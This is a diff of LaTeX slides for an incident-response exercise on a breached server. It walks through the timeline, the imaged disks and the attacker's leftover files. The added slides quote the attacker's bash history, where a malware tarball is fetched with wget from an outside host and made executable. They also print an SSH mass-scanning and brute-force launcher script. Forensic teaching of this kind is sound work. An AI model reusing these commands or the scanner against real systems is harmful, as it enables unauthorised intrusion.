@@ -20,7 +20,6 @@
 
 \usepackage{listings}
 
-
 \usepackage{graphicx}
 \graphicspath{ {./images/} }
 
@@ -35,7 +34,7 @@
 
 \maketitle
 
-\section[Outline]{}
+\section*{Outline}
 \frame{\tableofcontents}
 
 % -----------------------------------------------------------------------------------------
@@ -57,7 +56,7 @@
     \item Notified of breach on 24th November
 
         % 'what do we do now'
-
+\end{itemize}
 }
 
 \subsection{Technical}
@@ -97,54 +96,58 @@
 \begin{itemize}
 	\item System install: 17th November
 	\item Notification of breach: 24th November
+    \item Disks imaged, mounted read-only
 \end{itemize}
 }
 
 
 % -----------------------------------------------------------------------
-% Log analysis
+% Get people to look at logs 
 % -----------------------------------------------------------------------
 
-\section{Logs}
-\subsection{Bash}
-\frame{\frametitle{Bash}
-
-% % file: \_logs.tgz
-
-% \begin{center}
-%     \item \texttt{\_bash\_history} contains the command log
-%     \item 
-% \end{center}
+\section{Investigation}
+\frame{\frametitle{Investigation}
+\begin{itemize}
+    \item Stuff left over in \texttt{~daniel/}
+        \begin{itemize}
+            \item \texttt{~/.bssh}
+            \item \texttt{~/.vogz}
+        \end{itemize}
+    \item Logs (bash, auth, squid)
+    \item Resources pointed to by the above
+\end{itemize}
 }
 
-\subsection{Auth logs}
-\frame{\frametitle{Syslog}
-% file: \texttt{\_logs.tgz}
-% \begin{center}
-%     \item \texttt{auth.log} contains the system auth log
-%     \item \texttt{edited\_files\_in...} contains all files edited since November 23rd
-%     \item \texttt{var\_log\_squid3} contains \texttt{/var/log/squid3}.
-% \end{center}
-}
+\subsection{Logs}
+\frame{\frametitle{Logs}
 
+File: \texttt{logs.tgz}
+\begin{itemize}
+    \item \texttt{\_bash\_history} contains the command log
+    \item \texttt{auth.log} contains the system auth log
+    \item \texttt{edited\_files\_in...} contains all files edited since November 23rd
+    \item \texttt{var\_log\_squid3} contains \texttt{/var/log/squid3}.
+\end{itemize}
+}
 
 \subsection{Findings}
-\frame{\frametitle{Log Findings}
+\frame{\frametitle{BSSH}
 % Any files edited after 23rd
 
-\begin{center}
+File: \texttt{\_bssh.tgz}
+\begin{itemize}
 
+    \item Left over in ~daniel
 
-
-\end{center}
+\end{itemize}
 }
 
-
-\frame{\frametitle{Log Findings}
-% Any files edited after 23rd
+% Explain for those not familiar with bash
+\begin{frame}[fragile=singleslide]\frametitle{Bash Log}
+\begin{verbatim}
 w
 ls
-passwd
+pass wd
 ifconfig
 cat /proc/cpuinfo
 wget http://descargarcs.net63.net/fv/ghh.tgz
@@ -154,8 +157,23 @@ chmod +x *
 cd .vogz
 chmod +x *
 screen
-}
+\end{verbatim}
+\end{frame}
 
+
+\frame{\frametitle{Other Files}
+    \visible<1->{
+        So, what is at \\
+        \url{http://descargarcs.net63.net/fv/ghh.tgz} ?
+    }
+
+    \visible<2>{
+        File: \texttt{\_vogz.tgz}
+        % \begin{itemize}
+        %     \item 
+        % \end{itemize}
+    }
+}
 
 
 % -----------------------------------------------------------------------
@@ -170,15 +188,23 @@ screen
 }
 
 
-% \frame[fragile]{\frametitle{Log Findings}
-% Any files edited after 23rd
-
-% \begin[Language=bash]{lstlisting}
-   % grngrionigo 
-
-
-% \end{lstlisting}
-% }
+\frame[fragile=singleslide]{\frametitle{Log Findings}
+\small
+\begin{lstlisting}[language=bash]
+#!/bin/bash
+############### Config ###############
+pscanThreads=1000
+ssh2Threads=250
+port=22
+pscanTimeout=1
+ssh2Timeout=3
+############## Running ##############
+rm -rf scan.log session.txt
+./pscan $1 $port $pscanThreads $pscanTimeout unlimited
+sleep 2
+./ssh2 $ssh2Threads $port $ssh2Timeout unlimited 
+\end{lstlisting}
+}
 
 
 
